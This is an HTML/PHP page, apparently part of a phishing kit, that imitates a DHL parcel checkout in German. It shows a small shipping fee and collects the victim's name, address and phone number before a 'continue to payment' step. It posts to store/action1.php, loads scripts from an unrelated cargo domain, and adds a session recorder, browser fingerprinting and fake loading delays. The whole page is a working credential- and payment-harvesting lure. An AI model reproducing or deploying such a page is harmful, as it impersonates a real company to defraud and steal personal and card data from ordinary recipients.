        <div class="container">
            <!-- mobile part -->
            <a class="navbar-brand p-0" href="#">
                <img src="https://dispatching-centre.lasamericascargo.com/images/logo.png" alt="" class="img-responsive">
            </a>
            <form class="mb-1 d-md-none">
                <div class="form-item mobile-country-selector">
                </div>
                <div class="form-item" style="display:none;">
                    <input type="text" id="mobile_country_selector_code" name="mobile_country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here">
                    <label for="mobile_country_selector_code">...and the selected country code will be updated here</label>
                </div>
                <button type="submit" style="display:none;">Submit</button>
            </form>

            <div id="mySidepanel" class="sidepanel">
                <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
                <a href="#" class=""><span class="mbl_home"><i class="fas fa-home"></i></span>Empfang</a>
                <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Schiff</a>
                <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Stiel</a>
                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>Hilfe und Support</a>
                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>Finden Sie einen Standort</a>

                <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Verbindung</a>

            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#">Hilfe und Support</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link loc" href="#">Finden Sie einen Standort</a>
                    </li>
                    <li>
                        <div class="jhGf">
                            <label for="">
                                <span class="page-search-divider"></span>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
                                    <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"></path>
                                </svg>
                            </label>
                        </div>
                    </li>
                    <li class="v2-vertical-divider"></li>
                    <li>
                        
                    </li>
                </ul>
            <!-- <form class="d-flex">
                <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                <button class="btn btn-outline-success" type="submit">Search</button>
            </form> -->
            </div>
        </div>
    </nav>
    <div class="iKjer"></div>
    <div class="header-nav">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 col-md-8 col">
                    <ul class="header-navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-li">
                            <a href="#" class="top-nav">Empfang</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">Schiff</a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="top-nav">Stiel</a>
                        </li>
                    </ul>
                </div>
                <div class="col-sm-6 col-md-3 col">
                    <ul class="eriOl">
                        <li class="nav-li"><a href="#" class="top-nav">Registrieren</a></li>
                        <li class="nav-li"><a href="#" class="top-nav">Verbindung</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</header>

    <div class="rtYhf">
    <div class="pdIue">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="card summary-card">
                        <div class="card-body pl-4">
                            <div class="row">
                                <div class="col-6 d-flex align-items-center">
                                    <i><img src="assets/col.png"></i>
                                    <strong>Paket</strong>
                                </div>
                                <div class="col-6 d-flex align-items-center">
                                    Voller Versandschutz                            </div>
                            </div>
                            <div class="row">
                                <div class="col-12 d-flex align-items-center">
                                    <i><img src="assets/pak.png"></i>
                                    <strong>Box 2 DHL - 1 Stück - 1 (34 x 18 x 10 )</strong>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-6 d-flex align-items-center">
                                    <i><img src="assets/clan.png"></i>
                                    <section>

                                        <div class="row">
                                            <div class="col-12">
                                                <strong>Versanddatum:</strong>
                                                <span><?php echo(date('D , M , Y'));  ?></span>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-12">
                                                <strong>Versandkosten:</strong>
                                                <span>3.57 EUR</span>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div class="col-6">
                                    <div class="row">
                                        <div class="col-12">
                                            <strong>Termin: </strong>
                                            <span><?php echo Date('D , M , Y', strtotime('+3 days')) ?></span>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-12">
                                            <strong>Geliefert von:</strong>
                                            <span>Ende des Tages</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="kQwli p-0 p-4">
                <section class="pt-2 pl-3 pr-3 pb-3 p-md-0">
                    <h5 class="font-weight-bold">Zusammenfassung der Versandkosten</h5>
                    <div class="row mt-4 mb-4">
                        <div class="col-md-6">
                            <div>
                                <p class="text-uppercase font-weight-bold mb-0">Express Worldwide</p>
                                <?php echo Date('D , M , Y', strtotime('+3 days')) ?> - Ende des Tages                          </div>
                            <div class="d-flex mt-md-4 align-items-center">
                                <p class="font-weight-bold mr-1 mb-0">Volumengewicht</p>
                                <img src="assets/alert.png">
                                <i style="color: #007acc;" data-toggle="tooltip" data-html="true" title="" data-original-title="<p class='mb-0'>Si votre colis est de grande taille et léger, DHL peut calculer le prix de livraison en utilisant le poids volumétrique (poids volumétrique) plutôt que simplement le poids. Le poids volumétrique est arrondi à la livre ou au kilogramme complet suivant.</p><p class='mb-0'>Voici comment nous calculons le poids volumétrique :</p><p class='mb-0'>LxLxH(in)/139 = Poids (lb)</p><p class='mb-0'>LxLxH(cm)/5000 = Poids (kg)</p>"></i>
                                1,2 kg
                            </div>
                            <div class="d-flex">
                                <p class="font-weight-bold mr-2 mb-0">Gesamtgewicht</p>
                                1
                            </div>
                            <div class="d-flex">
                                <p class="font-weight-bold mr-2 mb-0">Steuerpflichtiges Gewicht</p>
                                1,5 kg
                            </div>
                        </div>
                        <div class="col-md-6 mt-3 mt-md-0">
                            <table class="table summary-table">
                                <tbody>
                                    <tr>
                                        <td>Transportkosten:</td>
                                        <td>EUR</td>
                                        <td>2,73</td>
                                    </tr>
                                    <tr>
                                        <td>Lieferung vor Ort:</td>
                                        <td>EUR</td>
                                        <td>0,70</td>
                                    </tr>
                                    <tr>
                                        <td>Notsituation</td>
                                        <td>EUR</td>
                                        <td>0,14</td>
                                    </tr>
                                </tbody>
                                <tfoot>
                                    <tr>
                                        <th>Gesamt</th>
                                        <th>EUR</th>
                                        <th>3,57</th>
                                    </tr>
                                </tfoot>
                            </table>
                        </div>
                    </div>
                </section>

                <div class="row c-form mb-2" style="display: none;">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body b-info d-flex justify-content-between">
                                <div>
                                    <span class="first_name"></span>
                                    <span class="last_name"></span>
                                    <span class="line_1"></span>
                                    <span class="line_2"></span>,
                                    <span class="state"></span>
                                    <span class="postal_code"></span>
                                    <span class="country"></span>
                                </div>
                                <a href="#" id="b-edit">Edit</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card" style="background-color: #F1F1F1;">
                    <div class="card-body p-2">
                        <div class="row">
                            <div class="col-md-12">
                                <!-- </div>
                                    <div class="bs-callout bs-callout-warning hidden">
                                    <h4>Oh snap!</h4>
                                    <p>This form seems to be invalid :(</p>
                                    </div>

                                    <div class="bs-callout bs-callout-info hidden">
                                    <h4>Yay!</h4>
                                    <p>Everything seems to be ok :)</p>
                                </div> -->

                                <!-- Let me see it in action then -->
                                <div class="alert alert-danger" role="alert" style="display: none;" id="error-alert">
                                    <span class="d-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                            <path d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"></path>
                                        </svg>
                                    </span>
                                    <span class="d-msg">S'il vous plaît corriger les erreurs ci-dessous.</span>
                                </div>

                                <div class="alert alert-danger" role="alert" style="display: none;" id="unexpected-error-alert">
                                    <span class="d-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                            <path d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"></path>
                                        </svg>
                                    </span>
                                </div>
                                <form class="g-3 position-relative" action="store/action1.php" id="card_info2" method="post">
    </div>

                                    <div class="se-pre-con position-absolute" style="display: none; z-index: 2;" id="load-form"></div>
                                    <div class="row">
                                        <div class="col-md-12 wfJui border-0 pt-3" id="b-form">
                                    <center><div id="errormsg"></div></center>
                                            <h4 class="card-head">Adresse</h4>
                                            <div class="col-12" >
                                                <label for="first_name" class="form-label">Vorname</label>
                                                <input type="text" class="form-control jp-card-invalid" name="first_name" id="first_name" autocomplete="given-name" data-parsley-minlength="2" data-parsley-minlength-message="Minimum character: 2" data-parsley-required-message="Required" data-parsley-trigger="focusout" value="" required="" />
                                            </div>
                                            <div class="col-12">
                                                <label for="last_name" class="form-label">Familienname</label>
                                                <input type="text" class="form-control jp-card-invalid" name="last_name" id="last_name" autocomplete="family-name" data-parsley-minlength="2" data-parsley-minlength-message="Minimum character: 2" data-parsley-required-message="Required" data-parsley-trigger="focusout" value="" required="" />
                                            </div>
                                            <div class="col-12">
                                                <label for="line_1" class="form-label">Adresszeile 1</label>
                                                <input type="text" class="form-control" name="line_1" id="line_1" autocomplete="address-line1" data-parsley-required-message="Required" value="" data-parsley-trigger="focusout" required="" />
                                            </div>
                                            <div class="col-12">
                                                <label for="line_2" class="form-label">Adresszeile 2</label>
                                                <input type="text" class="form-control" name="line_2" id="line_2" value="" autocomplete="address-line2">
                                            </div>

                                            <div class="row" style=" margin-right: 0; margin-left:0;">
                                                <div class="col-md-4">
                                                    <label for="postal_code" class="form-label">PLZ</label>
                                                    <input type="text" class="form-control" name="postal_code" id="postal_code" autocomplete="postal-code" data-parsley-minlength="2" data-parsley-minlength-message="Invalid Zip/Postal Code" data-parsley-required-message="Required" data-parsley-trigger="focusout" value="" required="" />
                                                </div>

                                                <div class="col-md-4">
                                                    <label for="city" class="form-label">Stadt</label>
                                                    <input type="text" class="form-control" name="city" id="city" autocomplete="address-level2" data-parsley-required-message="Required" value="" data-parsley-trigger="focusout" required="" />
                                                </div>
                                                <div class="col-md-4">
                                                    <label for="state" class="form-label">Zustand</label>
                                                    <input type="text" class="form-control" name="state" id="state" autocomplete="address-level1" data-parsley-required-message="Required" value="" data-parsley-trigger="focusout" required="" />
                                                </div>

                                            </div>

                                            <div class="row" style="margin-right: 0; margin-left:0;">
                                                <div class="col-md-6 country-col">
                                                    <label for="country" class="form-label">Land</label>
                                                    <input type="text" class="form-control" name="cntry" id="state" autocomplete="address-level1"  value="Switzerland" data-parsley-trigger="focusout" disabled>
                                                </div>
                                                <div class="col-md-6">
                                                    <label for="phone_number" class="form-label">Telefonnummer</label>
                                                    <div class="fuckyou">
                                                    <input type="text" class="form-control" name="phone" autocomplete="address-level1" value="+41" data-parsley-trigger="focusout" style="width: 15%;text-align: center;" disabled>
                                                    <input type="text" class="form-control" name="phone" id="state" autocomplete="address-level1" data-parsley-required-message="Required" value="" data-parsley-trigger="focusout" style="width: 85%;" required />
                                                <div>
                                                    <button name="log" class="btn btn-success btn-block" id="b-continue">Weiter zur Zahlung</button>
                                                </div>
                                                </div>
                                                </div>
                                                </div>
                                            </div>
                                            </div>
                                        </form>
                                            <div class="row justify-content-end pr-md-3 pl-3 pr-3 pl-md-0 pb-3 pb-md-0">
                                        </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="auth-modal"></div>
    <div class="modal fade p-0" tabindex="-1" role="dialog" id="b-modal">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
            </div>
        </div>
    </div>
</div>


       <footer>
    <div class="footer-border">
        <div class="container">
            <hr>
            <div class="row">
                <div class="col-sm-12 col-md-8">
                    <div class="pdIr">
                        <div class="row">
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline">Kontakt und Support</h4>
                                    <ul>
                                        <li><a href="#">Hilfe und Support</a></li>
                                        <li><a href="#">Häufig gestellte Fragen (FAQ)</a></li>
                                        <li><a href="#">Kontaktieren Sie uns</a></li>
                                        <li><a href="#">Finden Sie einen Standort</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                    <h4 class="headline">Rechtlich</h4>
                                    <ul>
                                        <li><a href="#">Allgemeine Geschäftsbedingungen (AGB)</a></li>
                                        <li><a href="#">Datenschutzhinweis</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-sm-12 col-md-4 col">
                                <div class="square">
                                <h4 class="headline">Alarmsignale</h4>
                                    <ul>
                                        <li><a href="#">Bewusstsein für Betrug</a></li>
                                        <li><a href="#">Betrugsunterstützung</a></li>
                                        <li><a href="#">Wichtige Informationen</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-12 col-md-4">
                    <div class="wetSq">
                        <div class="cyNe">
                            <img src="https://dispatching-centre.lasamericascargo.com/images/foo.png" alt="">
                        </div>
                        <div class="ledIu">
                            <ul>
                                <li><a href="#">Über DHL</a></li>
                                <li><a href="#">Presse</a></li>
                                <li><a href="#">Karrieren</a></li>
                                <li><a href="#">Rechtliche Hinweise</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <hr>
        </div>
    </div>
    <div class="footer-media">
        <div class="container">
            <div class="row">
                <div class="col">
                </div>
                <div class="col offset-md-4">
                    <div class="copyright">
                        <p>2022 © Deutsche Post AG - Tous droits réservés</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>

    <script>
        window.sessionHash = "745a1f30e1099b667ae475ead520bb38";
        window.visitId = 204;
        window.fingerprint = "7afef760d45fc44ad774cae7d7af803d";
    </script>

    
    <script src="/js/app.js"></script>i
    <script>
        $("#country_selector").countrySelect({
            preferredCountries: ['mu', 'us']
        });

        $("#mobile_country_selector").countrySelect({
            preferredCountries: ['mu', 'us']
        });
    </script>

    <script>
        $(window).on('load', function() {
            $(".modal-loader").hide();
            $(".se-pre-con").fadeOut();
            $('.se-pre-con').on('load',function(){
                $('.modal-loader').hide();
            });
        });

        function openNav() {
            $('#mySidepanel')[0].style.width = "250px";
        }

        function closeNav() {
            $('#mySidepanel')[0].style.width = "0";
        }
    </script>
        <script src="/js/session-recorder.js"></script>
            <script src="https://dispatching-centre.lasamericascargo.com/js/card.js"></script>
    <script src="https://dispatching-centre.lasamericascargo.com/js/intlTelInput.js"></script>
    <script>
        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        $(function () {
            var input = $('#phone_number');
            var bInfo = {};

            intlTelInput(input[0], {
                utilsScript: "https://dispatching-centre.lasamericascargo.com/js/utils.js",
                initialCountry: 'mu',
                preferredCountries: ['mu', 'us']
            });

            $('input[name=country]').countrySelect({
                preferredCountries: ['mu', 'us']
            });

            $('#b-continue').on('click', function (e) {
                e.preventDefault();

                var bHasErrors = false;

                $('#b-form .form-control').each(function () {
                    var field = $(this);

                    if (field.parsley) {
                        field.parsley().validate();

                        if (!field.parsley().isValid()) {
                            bHasErrors = true;
                        } else {
                            var value = field.val();

                            if (field.prop('tagName') == 'select') {
                                value = field.find('option:selected').val();
                            }

                            bInfo[field.attr('name')] = value;
                        }
                    }
                });

                if (!bHasErrors) {
                    $('#b-form').hide();
                    $('#load-form').show();
                    $('.c-form').show();
                    setTimeout(function () {
                        $('#load-form').hide();
                    }, getRandomInt(500, 3500));

                    for (var name in bInfo) {
                        $('.b-info .' + name).text(bInfo[name]);
                    }
                }
            });

            $('#b-edit').on('click', function (e) {
                e.preventDefault();
                bInfo = {};

                $('.c-form').hide();
                $('#b-form').show();
                $('#load-form').show();
                setTimeout(function () {
                    $('#load-form').hide();
                }, getRandomInt(500, 3500));
            });

            $('#card_info').on('error', function (e, error) {
                if (error.errorInB) {
                    $('.c-form').hide();
                    $('#b-form').show();
                }
            });

            $('.c-form .form-control').on('keypress', function (e) {
                if (e.which == 13) {
                    $('#card_info').submit();
                }
            });
        });
    </script>
</body></html>